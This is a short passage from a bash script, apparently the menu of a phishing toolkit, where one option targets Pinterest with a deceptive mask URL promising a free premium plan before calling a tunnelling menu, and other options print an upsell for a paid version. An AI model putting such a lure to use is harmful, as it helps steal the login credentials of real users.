                        website="pinterest"
                        mask='http://get-a-premium-plan-for-pinterest-free'
                        tunnel_menu;;
                13)
                        echo -ne "${GREEN}Try out the ${BLUE} Paid version to enjoy unlimited ${RED}acsess";;
                14)
                        echo -ne "${GREEN}Try out the ${BLUE} Paid version to enjoy unlimited ${RED}acsess";;
                15)
